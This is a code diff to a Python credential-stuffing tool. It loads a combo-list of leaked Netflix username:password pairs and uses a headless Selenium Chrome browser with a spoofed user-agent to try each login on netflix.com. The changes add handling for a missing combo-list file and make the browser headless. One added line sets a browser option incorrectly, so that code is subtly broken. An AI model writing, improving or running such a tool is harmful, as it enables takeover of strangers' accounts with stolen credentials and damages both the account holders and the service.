@@ -16,11 +16,16 @@ title()
 
 print("\n\033[38;5;226mCurrent IP {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))
 
-with open('netflix.txt','r') as net:
-	for line in net.readlines():
-		if details[2] in line:
-			user.append(line.split(":")[0])
-			passw.append(line.split(":")[1].split(" | ")[0])
+try:
+	with open('netflix','r') as net:
+		for line in net.readlines():
+			if details[2] in line:
+				user.append(line.split(":")[0])
+				passw.append(line.split(":")[1].split(" | ")[0])
+except FileNotFoundError:
+	print("No combo-list found.\nAdd one, and name it 'netflix' before starting the program.\nEnding.\n")
+	exit()
+	
 net.close()
 
 page = "https://www.netflix.com/login"
@@ -38,7 +43,10 @@ while counter < len(user):
 		break
 	else:
 		print("\033[38;5;226mConnection Status:\033[38;5;46m OK | ",end='')
-		browser = webdriver.Chrome()
+		browser_options = Options()
+		browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
+		browser_options.headless = True
+		browser = webdriver.Chrome(options = browser_options)
 		browser.set_window_size(300,400)
 		browser.get(page)
 		time.sleep(0.4)
